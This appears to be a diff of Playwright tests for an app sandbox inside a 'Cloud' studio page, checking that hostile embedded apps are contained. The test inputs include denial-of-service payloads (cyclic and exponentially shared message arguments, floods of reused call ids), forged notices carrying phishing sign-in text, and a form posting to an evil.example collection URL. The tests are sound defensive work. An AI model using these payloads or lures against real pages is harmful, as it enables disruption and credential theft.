@@ -295,7 +295,7 @@ document.querySelector("#ask").addEventListener("click", async () => {
     ).toBe("denied,limit");
     await app(page).locator("#ask").click();
     const stopped = () => events(page).then((list) => list.find((event) => event.type === "stopped")?.reason);
-    expect(await eventually(stopped, (reason) => reason !== undefined)).toBe("The app was stopped after three declined confirmations.");
+    expect(await eventually(stopped, (reason) => reason !== undefined)).toBe("refusals");
     expect(await page.locator("iframe.studio-app-frame").count()).toBe(0);
   } finally {
     await close();
@@ -321,7 +321,180 @@ test("messages from other windows are ignored, and a flood stops the app", async
     expect(await page.evaluate(() => globalThis.harness.calls)).toEqual([]);
     await app(page).locator("#go").click();
     const stopped = () => events(page).then((list) => list.find((event) => event.type === "stopped")?.reason);
-    expect(await eventually(stopped, (reason) => reason !== undefined)).toBe("The app sent too many messages and was stopped.");
+    expect(await eventually(stopped, (reason) => reason !== undefined)).toBe("flood");
+  } finally {
+    await close();
+  }
+});
+
+test("shared and cyclic arguments are measured once, so a tiny message cannot freeze the Cloud page", async () => {
+  const { page, close } = await open({
+    "index.html": "<main><h1>Graphs</h1><output id=out></output></main>",
+    "app.js": `const answers = new Map();
+addEventListener("message", (event) => {
+  if (event.data?.type !== "result" || event.data.id < 900) return;
+  answers.set(event.data.id, event.data.code);
+  if (answers.size === 3) document.querySelector("#out").textContent = JSON.stringify([...answers].sort(([a], [b]) => a - b).map(([, code]) => code)) + " " + Math.round(performance.now() - started);
+});
+const dag = (levels) => { let node = []; for (let i = 0; i < levels; i++) node = [node, node]; return node; };
+const cycle = {}; cycle.a = cycle; cycle.b = cycle;
+const started = performance.now();
+// 2^30 paths through 30 shared levels, a cycle, and nesting deeper than the host accepts.
+for (const [id, value] of [[900, dag(30)], [901, cycle], [902, dag(40)]])
+  parent.parent.postMessage({ type: "rpc", id, method: "storage", args: [value] }, "*");`,
+  });
+  try {
+    await ready(page);
+    const [codes, elapsed] = (await eventually(
+      () => text(page, "#out"),
+      (value) => !!value,
+      5000,
+    ))!.split(" ");
+    // Both graphs fit and then fail the storage input check; only the deep nesting hits the limit.
+    expect(JSON.parse(codes!)).toEqual(["invalid", "invalid", "limit"]);
+    expect(Number(elapsed)).toBeLessThan(1000);
+  } finally {
+    await close();
+  }
+});
+
+test("a reused call id is refused, so at most 32 calls of one app run at once", async () => {
+  const { page, close } = await open({
+    "index.html": "<main><h1>Ids</h1></main>",
+    "app.js": `const read = { scope: "shared", area: "kv", operation: "read", key: "k" };
+for (let i = 0; i < 100; i++) parent.parent.postMessage({ type: "rpc", id: 7, method: "storage", args: [read] }, "*");
+for (let i = 0; i < 40; i++) parent.parent.postMessage({ type: "rpc", id: 1000 + i, method: "storage", args: [read] }, "*");`,
+  });
+  try {
+    await ready(page);
+    await page.waitForTimeout(200);
+    const reads = await page.evaluate(() => globalThis.harness.calls.filter((call) => call.startsWith("storage:read")).length);
+    expect(reads).toBe(32);
+  } finally {
+    await close();
+  }
+});
+
+test("blocked external images are one sandbox finding, and the app keeps running", async () => {
+  sinkHits.length = 0;
+  const { page, close } = await open({
+    "index.html": "<main><h1>People</h1><ul id=list></ul></main>",
+    "app.js": `const list = document.querySelector("#list");
+for (let i = 0; i < 800; i++) {
+  const item = document.createElement("li");
+  const image = document.createElement("img");
+  image.alt = "";
+  image.src = "${SINK()}/avatar/" + i + ".png";
+  item.append(image, "Person " + i);
+  list.append(item);
+}`,
+  });
+  try {
+    await ready(page);
+    await page.waitForTimeout(500);
+    const all = await events(page);
+    expect(all.some((event) => event.type === "stopped")).toBe(false);
+    const blocked = all.filter((event) => event.type === "log" && String(event.text).startsWith("Blocked by the app sandbox"));
+    expect(blocked.map((event) => event.text)).toEqual([`Blocked by the app sandbox: img-src ${SINK()}`]);
+    expect(await app(page).locator("li").count()).toBe(800);
+    expect(sinkHits).toEqual([]);
+  } finally {
+    await close();
+  }
+});
+
+test("import-like text in comments and strings does not stop an app from loading", async () => {
+  const { page, close } = await open({
+    "index.html": "<main><output id=out>before</output></main>",
+    "app.js": `// import "./old.js" was removed
+const label = 'Import from "./data.csv"';
+import { done } from "./lib.js";
+document.querySelector("#out").textContent = done(label);`,
+    "lib.js": `/* export * from "./gone.js" */ export const done = (label) => "ran: " + label;`,
+  });
+  try {
+    await ready(page);
+    expect(await text(page, "#out")).toBe('ran: Import from "./data.csv"');
+    expect((await events(page)).filter((event) => event.type === "error")).toEqual([]);
+  } finally {
+    await close();
+  }
+});
+
+test("notices carry only a known code, never text from the app", async () => {
+  const { page, close } = await open({
+    "index.html": "<main><h1>Notices</h1></main>",
+    "app.js": `parent.parent.postMessage({ type: "notice", code: "denied", text: "Your Cloud session expired. Sign in again at https://login.example" }, "*");
+parent.parent.postMessage({ type: "notice", code: "Sign in at https://login.example" }, "*");
+cloud.capabilities.run("grids.rows.list", {});`,
+  });
+  try {
+    await ready(page);
+    const notices = () => events(page).then((list) => list.filter((event) => event.type === "notice"));
+    // The raw notice, then the unhandled refusal of the capability call.
+    expect(await eventually(notices, (list) => list.length >= 2)).toEqual([
+      { type: "notice", code: "denied" },
+      { type: "notice", code: "denied" },
+    ]);
+  } finally {
+    await close();
+  }
+});
+
+test("downloads follow the per-file budget of scripts, not the argument budget", async () => {
+  const { page, close } = await open({
+    "index.html": "<main><output id=out></output></main>",
+    "app.js": `await cloud.download("large.bin", new Blob([new Uint8Array(40 * 1024 * 1024)]));
+const result = await cloud.download("huge.bin", new Blob([new Uint8Array(51 * 1024 * 1024)])).then(() => "saved", (error) => error.code);
+document.querySelector("#out").textContent = result;`,
+  });
+  try {
+    await ready(page);
+    expect(
+      await eventually(
+        () => text(page, "#out"),
+        (value) => !!value,
+      ),
+    ).toBe("limit");
+    expect(await page.evaluate(() => globalThis.harness.downloads.map((file) => `${file.name} ${file.size}`))).toEqual([
+      `large.bin ${40 * 1024 * 1024}`,
+    ]);
+  } finally {
+    await close();
+  }
+});
+
+test("a link question that outlives its app opens nothing", async () => {
+  const { page, close } = await open(
+    {
+      "index.html": "<main><h1>Links</h1></main>",
+      "app.js": `addEventListener("message", (event) => event.data === "link" && open("${SINK()}/" + Math.random()));`,
+    },
+    { answers: [true, true] },
+  );
+  try {
+    await ready(page);
+    await page.evaluate(() => {
+      const opened: string[] = [];
+      Object.assign(globalThis, { opened });
+      window.open = (url?: string | URL) => {
+        opened.push(String(url));
+        return null;
+      };
+    });
+    const opened = () => page.evaluate(() => (globalThis as unknown as { opened: string[] }).opened.length);
+    const ask = () =>
+      page.evaluate(() =>
+        (document.querySelector("iframe.studio-app-frame") as HTMLIFrameElement).contentWindow![0]!.postMessage("link", "*"),
+      );
+    await ask();
+    expect(await eventually(opened, (count) => count === 1)).toBe(1);
+    await ask();
+    await page.waitForFunction(() => globalThis.harness.opened.length === 2);
+    // Stopped while the person still decides; the answer arrives 200 ms later.
+    await page.evaluate(() => globalThis.harness.stop());
+    await page.waitForTimeout(400);
+    expect(await opened()).toBe(1);
   } finally {
     await close();
   }
@@ -351,6 +524,31 @@ document.querySelector("#rows").textContent = rows[0].Name + " " + rows[0].Betra
     expect(snapshot).toContain("Müller 1234.56");
     const lint = (await events(page)).filter((event) => event.type === "error");
     expect(lint).toEqual([]);
+  } finally {
+    await close();
+  }
+});
+
+test("a snapshot shows the values a person entered, and its forms send nothing", async () => {
+  const { page, close } = await open({
+    "index.html": `<main><form action="https://evil.example/collect"><input id=name value="initial"><input id=ok type=checkbox>
+<select id=pick><option>a</option><option>b</option></select><textarea id=note>first</textarea><input id=secret type=password></form></main>`,
+  });
+  try {
+    await ready(page);
+    await app(page).locator("#name").fill("Changed");
+    await app(page).locator("#ok").check();
+    await app(page).locator("#pick").selectOption("b");
+    await app(page).locator("#note").fill("second");
+    await app(page).locator("#secret").fill("hunter2");
+    const snapshot = await page.evaluate(() => globalThis.harness.snapshot());
+    expect(snapshot).toContain('value="Changed"');
+    expect(snapshot).toMatch(/id="ok"[^>]*checked|checked[^>]*id="ok"/);
+    expect(snapshot).toMatch(/<option selected="">b<\/option>/);
+    expect(snapshot).toContain(">second</textarea>");
+    expect(snapshot).not.toContain("hunter2");
+    expect(snapshot).not.toContain("evil.example");
+    expect(snapshot).toContain("form-action 'none'");
   } finally {
     await close();
   }
